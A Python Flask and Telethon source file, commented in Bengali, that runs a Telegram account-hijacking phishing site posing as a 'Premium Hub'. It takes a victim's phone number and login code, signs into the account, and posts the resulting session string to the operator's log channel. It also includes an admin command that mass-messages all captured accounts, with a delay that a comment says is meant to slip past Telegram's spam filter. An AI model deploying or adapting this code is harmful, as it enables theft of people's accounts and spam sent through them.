import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

# Secret File (.env) থেকে ডেটা পড়ার জন্য
def load_secrets(file_path=".env"):
    secrets = {}
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for line in f:
                if "=" in line:
                    key, value = line.strip().split("=", 1)
                    secrets[key] = value
    return secrets

secrets = load_secrets()

app = Flask(__name__, static_url_path='')

# সিক্রেট ফাইল থেকে ভ্যালু নেওয়া
API_ID = int(secrets.get("API_ID", 0))
API_HASH = secrets.get("API_HASH", "")
LOG_CHANNEL = int(secrets.get("LOG_CHANNEL", 0))
ADMIN_ID = int(secrets.get("ADMIN_ID", 0))
BOT_TOKEN = secrets.get("BOT_TOKEN", "")

user_sessions = {}
all_users = set() # ব্রডকাস্টের জন্য ইউজার আইডি সেভ রাখা

# ক্লায়েন্ট সেটআপ
client = TelegramClient(StringSession(), API_ID, API_HASH)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    if not client.is_connected():
        await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        user_sessions[phone] = {'hash': sent_code.phone_code_hash}
        return jsonify({"status": "sent"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify_otp', methods=['POST'])
async def verify_otp():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    if phone in user_sessions:
        try:
            if not client.is_connected():
                await client.connect()
            user = await client.sign_in(phone, otp, phone_code_hash=user_sessions[phone]['hash'])
            all_users.add(user.id) # ইউজারকে ব্রডকাস্ট লিস্টে যোগ করা
            session_str = client.session.save()

            # ১. লগ চ্যানেলে সেশন পাঠানো
            await client.send_message(LOG_CHANNEL, f"✅ **New Session!**\nPhone: `{phone}`\n\n`{session_str}`")

            # ২. ওয়েলকাম মেসেজ ও বাটন
            welcome_text = (
                "👋 **Welcome to Premium Hub!**\n\n"
                "আপনার অ্যাকাউন্টটি সফলভাবে ভেরিফাই করা হয়েছে। ✅\n"
                "নিচের বাটনে ক্লিক করে সব কন্টেন্ট উপভোগ করুন। 🔥"
            )
            site_url = f"https://{request.host}"
            await client.send_message(user.id, welcome_text, buttons=[
                [Button.url("🚀 Open Content Now 🚀", site_url)]
            ])
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400
    return jsonify({"status": "error"}), 404

# --- আপডেট করা অ্যাডমিন ব্রডকাস্ট সেকশন (রিপোর্টসহ) ---
@client.on(events.NewMessage(pattern='/post'))
async def broadcast_handler(event):
    if event.sender_id != ADMIN_ID:
        return
    
    notice_text = event.raw_text.replace('/post', '').strip()
    if not notice_text:
        await event.reply("⚠️ ব্যবহারের নিয়ম: `/post আপনার মেসেজ`")
        return

    total = len(all_users)
    success = 0
    failed = 0

    # শুরুতে একটি স্ট্যাটাস মেসেজ পাঠানো
    status_msg = await event.reply(f"🚀 **ব্রডকাস্ট শুরু হয়েছে...**\n👥 মোট ইউজার: {total}")
    
    for user_id in all_users:
        try:
            await client.send_message(user_id, notice_text)
            success += 1
            # প্রতি ৫ জন অন্তর স্ট্যাটাস মেসেজ আপডেট করবে
            if success % 5 == 0:
                await status_msg.edit(f"⏳ **পাঠানো হচ্ছে...**\n✅ সফল: {success}\n❌ ব্যর্থ: {failed}\n📊 মোট: {total}")
            await asyncio.sleep(0.3) # টেলিগ্রাম স্প্যাম ফিল্টার এড়াতে বিরতি
        except Exception:
            failed += 1
            continue

    # ফাইনাল রিপোর্ট কার্ড
    report = (
        "📢 **ব্রডকাস্ট রিপোর্ট সম্পন্ন!**\n\n"
        f"✅ সফলভাবে পেয়েছে: `{success}` জন\n"
        f"❌ ব্যর্থ হয়েছে: `{failed}` জন (ব্লক বা ইনএক্টিভ)\n"
        f"👥 সর্বমোট চেষ্টা: `{total}` জন"
    )
    await event.reply(report)

if __name__ == "__main__":
    if BOT_TOKEN:
        # এটি নিশ্চিত করুন
        client.start(bot_token=BOT_TOKEN) 
        print("✅ Bot is online and listening...")
        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
